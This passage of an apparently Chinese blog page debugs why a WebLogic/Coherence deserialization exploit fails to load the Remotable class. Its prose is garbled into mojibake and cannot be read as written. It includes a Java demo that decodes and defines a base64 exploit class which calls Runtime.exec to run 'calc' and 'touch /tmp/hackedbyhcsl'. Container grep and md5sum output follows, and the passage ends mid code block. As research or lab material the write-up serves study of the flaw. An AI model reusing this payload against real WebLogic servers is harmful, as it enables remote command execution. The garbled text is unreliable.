</span></span></code></pre></td></tr></table></div></div><p>åœ¨è¿™ä¸ªæŠ¥é”™ä¸­ï¼Œ <code>java.lang.NoClassDefFoundError</code> æ˜¯ç”± <code>ClassNotFoundException</code> å¼•èµ·çš„ã€‚ æ‰€ä»¥æœ¬è´¨ä¸Šæ˜¯å› ä¸º <code>com.tangosol.internal.util.invoke.Remotable</code> æ‰¾ä¸åˆ°ï¼Œè€Œä¸æ˜¯<code>pers.neo.test1$8CEAA052CA2629E7D4BAD619B2948F57</code> ä¸å¯¹ã€‚å¦‚æœæˆ‘çœ‹å¾—å¤Ÿè®¤çœŸï¼Œæ€è€ƒå¾—è¶³å¤Ÿæ…¢ï¼Œä¸€æ—©è¯¥å‘ç°è¿™ä¸€ç‚¹ã€‚</p><h4 id=æœ¬åœ°defineclass-demoè°ƒè¯•>æœ¬åœ°defineClass demoè°ƒè¯•<a hidden class=anchor aria-hidden=true href=#æœ¬åœ°defineclass-demoè°ƒè¯•>#</a></h4><p>ä¸ºäº†ç†æ¸…æ¥šåˆ°åº•æ˜¯defineClassçš„é‚£ä¸ªç¯èŠ‚é€ æˆçš„æŠ¥é”™ï¼Œæˆ‘æœ¬åœ°å†™äº†ä¸ªdefineClassçš„demoå¹¶è°ƒè¯•ï¼ˆåå«defineclsï¼‰ï¼Œç„¶ååœ¨è¿™ä¸¤ç§å¼‚å¸¸ä¸‹æ–­ç‚¹ï¼Œç»ˆäºçœ‹åˆ°äº†æ›´çœŸç›¸çš„ä¸€å¹•ã€‚</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-82-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-82-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-82-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-82-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-82-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-82-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-82-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-82-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-82-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-82-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-82-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-82-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-82-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-82-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-82-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-82-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-82-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-82-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-82-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-82-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-82-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-82-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-82-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-82-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-82-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-82-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-82-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-82-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-82-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-82-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-82-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-82-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-82-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-82-17>17</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>import</span> java.util.Base64<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.lang.ClassLoader<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>main</span> <span style=color:#66d9ef>extends</span> ClassLoader <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span><span style=color:#f92672>(</span>String<span style=color:#f92672>[]</span> args<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        System<span style=color:#f92672>.</span><span style=color:#a6e22e>out</span><span style=color:#f92672>.</span><span style=color:#a6e22e>println</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;hi&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>new</span> main<span style=color:#f92672>().</span><span style=color:#a6e22e>df</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>df</span><span style=color:#f92672>(){</span>
</span></span><span style=display:flex><span>        String data<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;yv66vgAAADQAOQoABwAlCAAmCAAnCgAoACkKACgAKgcANwcALAcALQcALgcALwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAQTHBlcnMvbmVvL3Rlc3QxOwEAA2NtZAEAEkxqYXZhL2xhbmcvU3RyaW5nOwEACkV4Y2VwdGlvbnMHADABABRnZXRSZW1vdGVDb25zdHJ1Y3RvcgEANygpTGNvbS90YW5nb3NvbC9pbnRlcm5hbC91dGlsL2ludm9rZS9SZW1vdGVDb25zdHJ1Y3RvcjsBABRzZXRSZW1vdGVDb25zdHJ1Y3RvcgEAOChMY29tL3Rhbmdvc29sL2ludGVybmFsL3V0aWwvaW52b2tlL1JlbW90ZUNvbnN0cnVjdG9yOylWAQARcmVtb3RlQ29uc3RydWN0b3IBADVMY29tL3Rhbmdvc29sL2ludGVybmFsL3V0aWwvaW52b2tlL1JlbW90ZUNvbnN0cnVjdG9yOwEAEXNldFNlcnZlckxvY2F0aW9uAQAnKExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvU3RyaW5nOylWAQABcwEAAnMxBwAxAQARZ2V0U2VydmVyTG9jYXRpb24BACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAClNvdXJjZUZpbGUBAAp0ZXN0MS5qYXZhDAALAAwBAARjYWxjAQAXdG91Y2ggL3RtcC9oYWNrZWRieWhjc2wHADIMADMANAwANQA2AQAOcGVycy9uZW8vdGVzdDEBABBqYXZhL2xhbmcvT2JqZWN0AQArY29tL3Rhbmdvc29sL2ludGVybmFsL3V0aWwvaW52b2tlL1JlbW90YWJsZQEALndlYmxvZ2ljL2NsdXN0ZXIvc2luZ2xldG9uL0NsdXN0ZXJNYXN0ZXJSZW1vdGUBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAE2phdmEvaW8vSU9FeGNlcHRpb24BABhqYXZhL3JtaS9SZW1vdGVFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAvcGVycy9uZW8vdGVzdDEkOENFQUEwNTJDQTI2MjlFN0Q0QkFENjE5QjI5NDhGNTcBADFMcGVycy9uZW8vdGVzdDEkOENFQUEwNTJDQTI2MjlFN0Q0QkFENjE5QjI5NDhGNTc7ACEABgAHAAMACAAJAAoAAAAFAAEACwAMAAIADQAAAFcAAgACAAAAEyq3AAESAkwSA0y4AAQrtgAFV7EAAAACAA4AAAAWAAUAAAAPAAQAEAAHABEACgASABIAFAAPAAAAFgACAAAAEwAQADgAAAAHAAwAEgATAAEAFAAAAAQAAQAVAAEAFgAXAAEADQAAACwAAQABAAAAAgGwAAAAAgAOAAAABgABAAAAGQAPAAAADAABAAAAAgAQADgAAAABABgAGQABAA0AAAA1AAAAAgAAAAGxAAAAAgAOAAAABgABAAAAHwAPAAAAFgACAAAAAQAQADgAAAAAAAEAGgAbAAEAAQAcAB0AAgANAAAAPwAAAAMAAAABsQAAAAIADgAAAAYAAQAAACQADwAAACAAAwAAAAEAEAA4AAAAAAABAB4AEwABAAAAAQAfABMAAgAUAAAABAABACAAAQAhACIAAgANAAAANgABAAIAAAACAbAAAAACAA4AAAAGAAEAAAAoAA8AAAAWAAIAAAACABAAOAAAAAAAAgAeABMAAQAUAAAABAABACAAAQAjAAAAAgAk&#34;</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> b<span style=color:#f92672>=</span> Base64<span style=color:#f92672>.</span><span style=color:#a6e22e>getDecoder</span><span style=color:#f92672>().</span><span style=color:#a6e22e>decode</span><span style=color:#f92672>(</span>data<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        Class<span style=color:#f92672>&lt;?&gt;</span> c<span style=color:#f92672>=</span> defineClass<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;pers.neo.test1$8CEAA052CA2629E7D4BAD619B2948F57&#34;</span><span style=color:#f92672>,</span>b<span style=color:#f92672>,</span><span style=color:#ae81ff>0</span><span style=color:#f92672>,</span>b<span style=color:#f92672>.</span><span style=color:#a6e22e>length</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        String cname<span style=color:#f92672>=</span>c<span style=color:#f92672>.</span><span style=color:#a6e22e>getClass</span><span style=color:#f92672>().</span><span style=color:#a6e22e>getName</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        System<span style=color:#f92672>.</span><span style=color:#a6e22e>out</span><span style=color:#f92672>.</span><span style=color:#a6e22e>println</span><span style=color:#f92672>(</span>cname<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=image-20220324173748317.png alt=image-20220324173748317></p><p><code>defineClass:-1 ClassLoader(java.lang)</code> æ˜¯nativeå‡½æ•°ï¼Œè¿›å…¥åæˆåŠŸå®Œæˆæœ€å¤–å±‚æ“ä½œï¼Œç„¶åå› ä¸ºéœ€è¦ç»§ç»­æ„é€ ååºåˆ—åŒ–é“¾ï¼Œå¾€é‡Œå°è¯•å¯»æ‰¾<code>com.tangosol.internal.util.invoke.Remotable</code> ç±»ã€‚</p><p>å¦‚ä¸‹å›¾ï¼Œä¸‰æ­¥èµ°ã€‚</p><ol><li>ä½¿ç”¨ <code>findLoadedClass(String)</code> çœ‹ç±»æ˜¯å¦å·²è¢«åŠ è½½ã€‚</li><li>ä½¿ç”¨çˆ¶ç±»åŠ è½½å™¨loadClassï¼Œæ²¡æœ‰çˆ¶ç±»åŠ è½½å™¨ä¸ºnullå°±ç”¨è™šæ‹Ÿæœºå†…ç½®åŠ è½½å™¨ã€‚</li><li>ä½¿ç”¨findClasså¯»æ‰¾ã€‚</li></ol><p><img loading=lazy src=image-20220325100044985.png alt=image-20220325100044985></p><p>æ­¥éª¤ä¸€findLoadedClasså¤±è´¥</p><p>æ­¥éª¤äºŒçš„çˆ¶ç±»åŠ è½½å™¨ä¾æ¬¡æ˜¯<code>sun.misc.Launcher$AppClassLoader</code>ã€ <code>sun.misc.Launcher$ExtClassLoader</code> å’Œnullã€‚</p><p><img loading=lazy src=image-20220325101613996.png alt=image-20220325101613996></p><p>æ­¥éª¤ä¸‰findClass</p><p><img loading=lazy src=image-20220325102507468.png alt=image-20220325102507468></p><p>è·Ÿå…¥ï¼Œæ²¡æœ‰æ‰¾åˆ°ï¼ŒæŠ›å‡ºå¼‚å¸¸</p><p><img loading=lazy src=image-20220325102843921.png alt=image-20220325102843921></p><p>è‡³æ­¤å°±å®Œå…¨è§£é‡Šäº†å› ä¸º <code>Caused By: java.lang.ClassNotFoundException: com.tangosol.internal.util.invoke.Remotable</code> å¯¼è‡´ <code>java.lang.NoClassDefFoundError: com/tangosol/internal/util/invoke/Remotable</code> çš„é—®é¢˜äº†ã€‚</p><p>ä½†è‡³äºæ˜¯ä¸ºä»€ä¹ˆæ‰¾ä¸åˆ°Remotableï¼Œå°±æ˜¯å¦ä¸€ä¸ªéœ€è¦å†å°è¯•å›ç­”çš„é—®é¢˜äº†ã€‚</p><h4 id=æ·»åŠ ä¾èµ–åæœ¬åœ°å¯æˆåŠŸdefineclass>æ·»åŠ ä¾èµ–åæœ¬åœ°å¯æˆåŠŸdefineClass<a hidden class=anchor aria-hidden=true href=#æ·»åŠ ä¾èµ–åæœ¬åœ°å¯æˆåŠŸdefineclass>#</a></h4><p>ç»™ä¸Šè¿°demoçš„libåŠ ä¸Šcoherence.jarè¿™ä¸ªç±»ä¹‹åæŠ¥é”™å˜åŒ–äº†ï¼Œç¼ºå°‘ <code>weblogic.cluster.singleton.ClusterMaster</code> ã€‚å†åŠ ä¸Š <code>wlfullclient.jar</code> ï¼Œå°±OKäº†ï¼ŒæˆåŠŸdefineå‡ºè¿™ä¸ªç±»ã€‚</p><p><img loading=lazy src=image-20220325105132325.png alt=image-20220325105132325></p><h4 id=ä½¿ç”¨arthasåœ¨æœåŠ¡ç«¯èƒ½æ‰¾åˆ°remotable-ç±»>ä½¿ç”¨arthasåœ¨æœåŠ¡ç«¯èƒ½æ‰¾åˆ°<code>Remotable</code> ç±»<a hidden class=anchor aria-hidden=true href=#ä½¿ç”¨arthasåœ¨æœåŠ¡ç«¯èƒ½æ‰¾åˆ°remotable-ç±»>#</a></h4><p>é‚£å°±æ˜¯è¯´æ˜¯å› ä¸ºæœåŠ¡ç«¯æ‰¾ä¸åˆ°è¿™ä¸ªç±»ã€‚å¯æ˜¯æˆ‘ä»¬å¯ä»¥çœ‹åˆ° <code>com.tangosol.internal.util.invoke.Remotable</code> è¿™ä¸ªç±»åœ¨oammså®¹å™¨ä¸­æœ‰ä¸¤å¤„å­˜åœ¨</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-83-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-83-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-83-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-83-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-83-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-83-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-83-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-83-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-83-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-83-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-83-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-83-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-83-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-83-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-83-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-83-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-83-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-83-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-83-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-83-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-83-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-83-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-83-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-83-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-83-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-83-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-83-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-83-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-83-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-83-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-83-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-83-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-83-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-83-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-83-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-83-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-83-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-83-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-83-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-83-20>20</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># cls=&#34;com.tangosol.internal.util.invoke.Remotable&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># grep -P &#34;$cls|\.jar&#34; oamms_tree.txt |grep -P &#34;$cls&#34; -B1 </span>
</span></span><span style=display:flex><span>/u01/oracle/coherence/lib/coherence.jar
</span></span><span style=display:flex><span>com/tangosol/internal/util/invoke/Remotable.class
</span></span><span style=display:flex><span>com/tangosol/internal/util/invoke/RemotableClassGenerator.class
</span></span><span style=display:flex><span>com/tangosol/internal/util/invoke/RemotableSupport.class
</span></span><span style=display:flex><span>--
</span></span><span style=display:flex><span>/u01/oracle/idm/oam/server/lib/jmx/coherence.jar
</span></span><span style=display:flex><span>com/tangosol/internal/util/invoke/Remotable.class
</span></span><span style=display:flex><span>com/tangosol/internal/util/invoke/RemotableClassGenerator.class
</span></span><span style=display:flex><span>com/tangosol/internal/util/invoke/RemotableSupport.class
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># grep -P &#34;$cls|\.jar&#34; oamms_tree.txt |grep -P &#34;$cls&#34; -B1 |grep jar |xargs -i{} docker exec oamms md5sum {}</span>
</span></span><span style=display:flex><span>b28ee46b9b9bd5c24df3bfee10075ba4  /u01/oracle/coherence/lib/coherence.jar
</span></span><span style=display:flex><span>7b30411369752fc711a257ea6fb7e3d1  /u01/oracle/idm/oam/server/lib/jmx/coherence.jar
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># grep -P &#34;$cls|\.jar&#34; oamms_tree.txt |grep -P &#34;$cls&#34; -B1 |grep jar |xargs -i{} docker exec oamms ls -lS {}</span>
</span></span><span style=display:flex><span>-rw-r----- <span style=color:#ae81ff>1</span> oracle oracle <span style=color:#ae81ff>13490976</span> Sep <span style=color:#ae81ff>12</span>  <span style=color:#ae81ff>2019</span> /u01/oracle/coherence/lib/coherence.jar
</span></span><span style=display:flex><span>-rw-r----- <span style=color:#ae81ff>1</span> oracle oracle <span style=color:#ae81ff>13490779</span> Sep <span style=color:#ae81ff>10</span>  <span style=color:#ae81ff>2019</span> /u01/oracle/idm/oam/server/lib/jmx/coherence.jar
</span></span></code></pre></td></tr></table></div></div><p>åœ¨å®¹å™¨ä¸­ä½¿ç”¨ arthas ä¹Ÿæ˜¯èƒ½æ‰¾åˆ°ç±»çš„</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-21>21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-22>22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-23>23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-24><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-24>24</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-25><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-25>25</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-26><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-26>26</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-27><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-27>27</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-28><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-28>28</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-29><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-29>29</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-30><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-30>30</a>
